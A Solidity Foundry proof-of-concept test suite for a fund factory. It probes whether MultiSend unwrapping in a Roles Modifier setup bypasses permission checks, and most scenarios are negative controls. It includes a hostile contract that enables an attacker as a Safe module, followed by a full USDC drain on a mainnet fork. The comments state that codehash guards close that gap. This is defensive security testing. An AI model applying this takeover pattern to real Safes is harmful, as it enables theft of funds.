// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {KpkOivFactory} from "src/KpkOivFactory.sol";
import {KpkTimelockDeployer} from "src/KpkTimelockDeployer.sol";
import {KpkShares} from "src/kpkShares.sol";
import {
    TimelockControllerUpgradeable
} from "@openzeppelin/contracts-upgradeable/governance/TimelockControllerUpgradeable.sol";
import {KpkShares} from "src/kpkShares.sol";
import {IRoles} from "src/interfaces/IRoles.sol";
import {OivTestConstants} from "test/OivTestConstants.sol";

/// @dev Extra Roles v2.1.1 surface the production `IRoles` interface does not expose.
interface IRolesExt {
    function allowTarget(bytes32 roleKey, address targetAddress, uint8 options) external;
    function scopeFunction(
        bytes32 roleKey,
        address targetAddress,
        bytes4 selector,
        ConditionFlat[] memory conditions,
        uint8 options
    ) external;
    function setAllowance(
        bytes32 key,
        uint128 balance,
        uint128 maxRefill,
        uint128 refill,
        uint64 period,
        uint64 timestamp
    ) external;
    function allowances(bytes32 key)
        external
        view
        returns (uint128 refill, uint128 maxRefill, uint64 period, uint128 balance, uint64 timestamp);
}

struct ConditionFlat {
    uint8 parent;
    uint8 paramType;
    uint8 operator;
    bytes compValue;
}

interface ISafeLike {
    function enableModule(address module) external;
    function isModuleEnabled(address module) external view returns (bool);
    function execTransactionFromModule(address to, uint256 value, bytes calldata data, uint8 operation)
        external
        returns (bool);
}

/// @notice A hostile contract occupying the address the factory hardcodes as `MULTI_SEND`.
///         Exposes `multiSend(bytes)` so the (target, selector) unwrapper key still matches,
///         but ignores the payload entirely. It runs via DELEGATECALL in the Avatar Safe's
///         context, so `address(this)` is the Safe and Safe's `authorized` modifier passes.
contract HostileMultiSend {
    address public constant ATTACKER = address(0xBADBAD);

    function multiSend(bytes memory) public payable {
        ISafeLike(address(this)).enableModule(ATTACKER);
    }
}

/// @title MultiSend unwrapper attack surface — PoC suite for PR #37
/// @notice Records WHY the factory asserts the exact codehash of all three MultiSend-unwrapping
///         addresses, and what batching does and does not grant.
///
///         Scenario A is the load-bearing one: registering an unwrap adapter for `(target, selector)`
///         makes `PermissionChecker._authorize` take a branch that never reads `role.targets[to]`
///         and never evaluates the outer `ExecutionOptions`, so it is an unconditional
///         un-permission-checked DELEGATECALL grant to that target for every role. B and C show the
///         consequences when the code at such a target is not what we assume.
///
///         IMPORTANT — B and C describe a gap that is now CLOSED. `_deployAndWireStack` asserts the
///         exact codehash of `MULTI_SEND`, `MULTI_SEND_CALLS_ONLY` and `MULTISEND_UNWRAPPER`, so
///         neither is reachable through an ordinary fund deploy; both reach their state by `vm.etch`
///         AFTER `deployOiv` has run, deliberately stepping around the guard. The guards' own
///         coverage lives in `test/KpkOivFactory.t.sol`
///         (`test_deployOiv_revertsWhenMultiSendIsNotCanonical` and siblings).
///
///         D–H are the hypotheses that were tested and REJECTED: batching cannot bypass
///         `ExecutionOptions.DelegateCall` or `Send`, cannot exceed an allowance (consumptions
///         accumulate across entries), cannot recurse through a nested `multiSend`, and cannot mix
///         roles. The inner calls of a batch are permission-checked exactly as unbatched calls.
contract MultiSendUnwrapperSurfaceTest is OivTestConstants {
    address factoryOwner = makeAddr("factoryOwner");
    address admin = makeAddr("admin");
    address managerSigner = makeAddr("managerSigner");
    address feeReceiver = makeAddr("feeReceiver");
    address attacker = address(0xBADBAD);

    KpkOivFactory factory;
    KpkOivFactory.OivConfig cfg;
    KpkOivFactory.OivInstance inst;

    bytes32 constant MANAGER = bytes32("MANAGER");
    bytes4 constant MULTISEND_SEL = bytes4(keccak256("multiSend(bytes)"));
    address constant MULTI_SEND = 0x38869bf66a61cF6bDB996A6aE40D5853Fd43B526;

    address execMod;
    address avatarSafe;
    address managerSafe;

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_URL"));
        _requireInfraDeployed();

        // Nonce map: n = timelock deployer, n+1 = shares deployer, n+2 = factory.
        KpkShares sharesMastercopy = new KpkShares();
        KpkTimelockDeployer tdep = new KpkTimelockDeployer(address(new TimelockControllerUpgradeable()));
        factory = new KpkOivFactory(
            factoryOwner,
            SAFE_PROXY_FACTORY,
            SAFE_SINGLETON,
            SAFE_MODULE_SETUP,
            SAFE_FALLBACK_HANDLER,
            MODULE_PROXY_FACTORY,
            ROLES_MODIFIER_MASTERCOPY,
            address(sharesMastercopy),
            address(tdep)
        );

        address[] memory owners = new address[](1);
        owners[0] = managerSigner;
        cfg.managerSafe = KpkOivFactory.SafeConfig({owners: owners, threshold: 1});
        cfg.salt = 4242;
        cfg.admin = admin;
        cfg.sharesParams = KpkShares.ConstructorParams({
            asset: USDC,
            admin: address(0),
            name: "PoC Fund",
            symbol: "kPOC",
            safe: address(0),
            subscriptionRequestTtl: 1 days,
            redemptionRequestTtl: 1 days,
            feeReceiver: feeReceiver,
            managementFeeRate: 100,
            redemptionFeeRate: 50,
            performanceFeeModule: address(0),
            performanceFeeRate: 0
        });

        inst = factory.deployOiv(cfg);
        execMod = inst.execRolesModifier;
        avatarSafe = inst.avatarSafe;
        managerSafe = inst.managerSafe;

        // The ONLY permission this role ever gets: USDC.approve, plain CALL, no delegatecall,
        // no ether. Deliberately the most boring grant imaginable.
        vm.startPrank(admin);
        IRoles(execMod).scopeTarget(MANAGER, USDC);
        IRoles(execMod).allowFunction(MANAGER, USDC, IERC20.approve.selector, 0);
        vm.stopPrank();

        deal(USDC, avatarSafe, 1_000_000e6);
    }

    // ── helpers ────────────────────────────────────────────────────────────────

    function _entry(uint8 op, address to, uint256 value, bytes memory data) internal pure returns (bytes memory) {
        return abi.encodePacked(op, to, value, data.length, data);
    }

    function _batch(bytes memory txs) internal pure returns (bytes memory) {
        return abi.encodeWithSignature("multiSend(bytes)", txs);
    }

    function _approve() internal pure returns (bytes memory) {
        return abi.encodeCall(IERC20.approve, (address(1), 0));
    }

    // ══════════════════════════════════════════════════════════════════════════
    // A. The OUTER delegatecall to MULTI_SEND is never permission-checked.
    // ══════════════════════════════════════════════════════════════════════════

    function test_A_outerDelegatecallToMultiSendBypassesTargetClearance() public {
        // CONTROL: the MANAGER role has NO clearance whatsoever on MULTI_SEND.
        // Any other selector, delegatecalled to the very same address, is rejected.
        vm.prank(managerSafe);
        vm.expectRevert();
        IRoles(execMod).execTransactionWithRole(MULTI_SEND, 0, abi.encodePacked(bytes4(0xdeadbeef)), 1, MANAGER, true);

        // EXPLOIT PATH: the same address, delegatecalled, with the multiSend selector, is
        // authorized WITHOUT any target clearance and WITHOUT ExecutionOptions.DelegateCall.
        bytes memory batch = _batch(_entry(0, USDC, 0, _approve()));
        vm.prank(managerSafe);
        bool ok = IRoles(execMod).execTransactionWithRole(MULTI_SEND, 0, batch, 1, MANAGER, true);
        assertTrue(ok, "batch executed with zero permission on MULTI_SEND");
    }

    // ══════════════════════════════════════════════════════════════════════════
    // B. Registered target with NO code -> batch "succeeds", nothing runs,
    //    allowance is permanently burned. The factory never checks MULTI_SEND.
    // ══════════════════════════════════════════════════════════════════════════

    function test_B_codelessRegisteredTargetSilentlyBurnsAllowance() public {
        bytes32 allowanceKey = keccak256("USDC_LIMIT");

        ConditionFlat[] memory c = new ConditionFlat[](3);
        c[0] = ConditionFlat({parent: 0, paramType: 5, operator: 5, compValue: ""}); // Calldata/Matches
        c[1] = ConditionFlat({parent: 0, paramType: 1, operator: 0, compValue: ""}); // address: Pass
        c[2] = ConditionFlat({parent: 0, paramType: 1, operator: 28, compValue: abi.encode(allowanceKey)});

        vm.startPrank(admin);
        IRolesExt(execMod).setAllowance(allowanceKey, 1000e6, 0, 0, 0, 0);
        IRolesExt(execMod).scopeFunction(MANAGER, USDC, IERC20.transfer.selector, c, 0);
        vm.stopPrank();

        // HISTORICAL: when this PoC was written the factory checked only that the UNWRAPPER had
        // code, and asserted nothing about the two MultiSend targets — so this scenario was
        // reachable through an ordinary fund deploy. That gap is now CLOSED: `_deployAndWireStack`
        // asserts the exact codehash of all three (`MultiSendUnwrapperMissing`,
        // `MultiSendMissing(address)`), which is precisely what this PoC motivated.
        //
        // The scenario is retained because it documents the CONSEQUENCE the guards prevent, and it
        // only still executes because the `vm.etch` below runs AFTER `deployOiv` in `setUp` — i.e.
        // it deliberately steps around the guard to reach the state a codeless target produces.
        // Do not read it as evidence that the factory is unvalidated; see
        // `test_deployOiv_revertsWhenMultiSendIsNotCanonical` for the guard's own coverage.
        assertGt(factory.MULTISEND_UNWRAPPER().code.length, 0, "unwrapper present");
        vm.etch(MULTI_SEND, "");
        assertEq(MULTI_SEND.code.length, 0, "MultiSend absent (etched past the deploy-time guard)");

        uint256 balBefore = IERC20(USDC).balanceOf(avatarSafe);
        bytes memory batch = _batch(_entry(0, USDC, 0, abi.encodeCall(IERC20.transfer, (attacker, 1000e6))));

        vm.prank(managerSafe);
        bool ok = IRoles(execMod).execTransactionWithRole(MULTI_SEND, 0, batch, 1, MANAGER, true);

        (,,, uint128 balAfterAllowance,) = IRolesExt(execMod).allowances(allowanceKey);

        assertTrue(ok, "modifier reports SUCCESS");
        assertEq(IERC20(USDC).balanceOf(avatarSafe), balBefore, "no tokens actually moved");
        assertEq(IERC20(USDC).balanceOf(attacker), 0, "recipient got nothing");
        assertEq(balAfterAllowance, 0, "allowance was fully consumed for a no-op");
    }

    // ══════════════════════════════════════════════════════════════════════════
    // C. Hostile occupant at the registered target => Avatar Safe takeover from a
    //    role that only holds USDC.approve.
    // ══════════════════════════════════════════════════════════════════════════

    function test_C_hostileOccupantAtRegisteredTargetTakesOverAvatarSafe() public {
        HostileMultiSend hostile = new HostileMultiSend();
        vm.etch(MULTI_SEND, address(hostile).code);

        assertFalse(ISafeLike(avatarSafe).isModuleEnabled(attacker), "precondition");

        // Payload is irrelevant; it only has to parse as a well-formed batch so the unwrapper
        // returns something the modifier can "check". The hostile code ignores it entirely.
        bytes memory batch = _batch(_entry(0, USDC, 0, _approve()));

        vm.prank(managerSafe);
        IRoles(execMod).execTransactionWithRole(MULTI_SEND, 0, batch, 1, MANAGER, true);

        assertTrue(ISafeLike(avatarSafe).isModuleEnabled(attacker), "attacker is now an Avatar Safe module");

        // Full drain, no Roles Modifier involved any more.
        uint256 pot = IERC20(USDC).balanceOf(avatarSafe);
        vm.prank(attacker);
        ISafeLike(avatarSafe).execTransactionFromModule(USDC, 0, abi.encodeCall(IERC20.transfer, (attacker, pot)), 0);
        assertEq(IERC20(USDC).balanceOf(attacker), pot, "avatar safe drained");
        assertEq(IERC20(USDC).balanceOf(avatarSafe), 0, "avatar safe empty");
    }

    // ══════════════════════════════════════════════════════════════════════════
    // D. NEGATIVE CONTROL: inner DELEGATECALL still requires the DelegateCall flag.
    // ══════════════════════════════════════════════════════════════════════════

    function test_D_innerDelegateCallStillRequiresExecutionOption() public {
        bytes memory batch = _batch(_entry(1, USDC, 0, _approve())); // op = 1 => delegatecall

        vm.prank(managerSafe);
        vm.expectRevert(); // ConditionViolation(DelegateCallNotAllowed)
        IRoles(execMod).execTransactionWithRole(MULTI_SEND, 0, batch, 1, MANAGER, true);

        // With options = 2 (DelegateCall) the same batch authorizes.
        vm.prank(admin);
        IRoles(execMod).allowFunction(MANAGER, USDC, IERC20.approve.selector, 2);

        vm.prank(managerSafe);
        IRoles(execMod).execTransactionWithRole(MULTI_SEND, 0, batch, 1, MANAGER, true);
    }

    // ══════════════════════════════════════════════════════════════════════════
    // E. NEGATIVE CONTROL: nested multiSend is NOT recursively unwrapped; the inner
    //    entry is checked as a plain target and rejected.
    // ══════════════════════════════════════════════════════════════════════════

    function test_E_nestedMultiSendIsRejected() public {
        bytes memory innerBatch = _batch(_entry(0, USDC, 0, _approve()));
        bytes memory outer = _batch(_entry(1, MULTI_SEND, 0, innerBatch));

        vm.prank(managerSafe);
        vm.expectRevert(); // TargetAddressNotAllowed on the inner MULTI_SEND entry
        IRoles(execMod).execTransactionWithRole(MULTI_SEND, 0, outer, 1, MANAGER, true);
    }

    // ══════════════════════════════════════════════════════════════════════════
    // F. NEGATIVE CONTROL: allowances accumulate correctly across a batch.
    // ══════════════════════════════════════════════════════════════════════════

    function test_F_allowanceAccumulatesAcrossBatch() public {
        bytes32 k = keccak256("USDC_LIMIT");
        ConditionFlat[] memory c = new ConditionFlat[](3);
        c[0] = ConditionFlat({parent: 0, paramType: 5, operator: 5, compValue: ""});
        c[1] = ConditionFlat({parent: 0, paramType: 1, operator: 0, compValue: ""});
        c[2] = ConditionFlat({parent: 0, paramType: 1, operator: 28, compValue: abi.encode(k)});

        vm.startPrank(admin);
        IRolesExt(execMod).setAllowance(k, 1000e6, 0, 0, 0, 0);
        IRolesExt(execMod).scopeFunction(MANAGER, USDC, IERC20.transfer.selector, c, 0);
        vm.stopPrank();

        // 2 x 600 = 1200 > 1000 -> must be rejected as a batch, not slip through.
        bytes memory over = _batch(
            bytes.concat(
                _entry(0, USDC, 0, abi.encodeCall(IERC20.transfer, (attacker, 600e6))),
                _entry(0, USDC, 0, abi.encodeCall(IERC20.transfer, (attacker, 600e6)))
            )
        );
        vm.prank(managerSafe);
        vm.expectRevert();
        IRoles(execMod).execTransactionWithRole(MULTI_SEND, 0, over, 1, MANAGER, true);

        // 2 x 500 = 1000 exactly -> allowed, and the allowance is fully drained.
        bytes memory exact = _batch(
            bytes.concat(
                _entry(0, USDC, 0, abi.encodeCall(IERC20.transfer, (attacker, 500e6))),
                _entry(0, USDC, 0, abi.encodeCall(IERC20.transfer, (attacker, 500e6)))
            )
        );
        vm.prank(managerSafe);
        IRoles(execMod).execTransactionWithRole(MULTI_SEND, 0, exact, 1, MANAGER, true);

        (,,, uint128 bal,) = IRolesExt(execMod).allowances(k);
        assertEq(bal, 0, "allowance fully consumed");
        assertEq(IERC20(USDC).balanceOf(attacker), 1000e6, "exactly the allowance moved");
    }

    // ══════════════════════════════════════════════════════════════════════════
    // G. NEGATIVE CONTROL: inner ether send still requires the Send flag, and the
    //    outer call may not carry value.
    // ══════════════════════════════════════════════════════════════════════════

    function test_G_innerValueRequiresSendOption() public {
        vm.deal(avatarSafe, 10 ether);
        bytes memory batch = _batch(_entry(0, USDC, 1 ether, _approve()));

        vm.prank(managerSafe);
        vm.expectRevert(); // SendNotAllowed
        IRoles(execMod).execTransactionWithRole(MULTI_SEND, 0, batch, 1, MANAGER, true);

        // Outer value != 0 is refused by the unwrapper itself.
        vm.deal(managerSafe, 1 ether);
        bytes memory plain = _batch(_entry(0, USDC, 0, _approve()));
        vm.prank(managerSafe);
        vm.expectRevert(); // MalformedMultiEntrypoint
        IRoles(execMod).execTransactionWithRole(MULTI_SEND, 1, plain, 1, MANAGER, true);
    }

    // ══════════════════════════════════════════════════════════════════════════
    // H. The manager Roles Modifier is wired with unwrappers but has no role members
    //    and no modules: the registration is inert at deploy time.
    // ══════════════════════════════════════════════════════════════════════════

    function test_H_managerModifierHasNoMembersAtDeploy() public view {
        address mgrMod = inst.managerRolesModifier;
        assertEq(IRoles(mgrMod).owner(), managerSafe, "manager mod owned by manager safe");
        assertEq(IRoles(mgrMod).avatar(), managerSafe);
        assertEq(IRoles(mgrMod).target(), managerSafe);
        assertFalse(IRoles(mgrMod).isModuleEnabled(managerSafe), "manager safe is NOT a module of its own modifier");
        assertEq(
            IRoles(mgrMod).unwrappers(bytes32(bytes20(MULTI_SEND)) | (bytes32(MULTISEND_SEL) >> 160)),
            factory.MULTISEND_UNWRAPPER(),
            "unwrapper registered on an otherwise inert modifier"
        );
    }
}
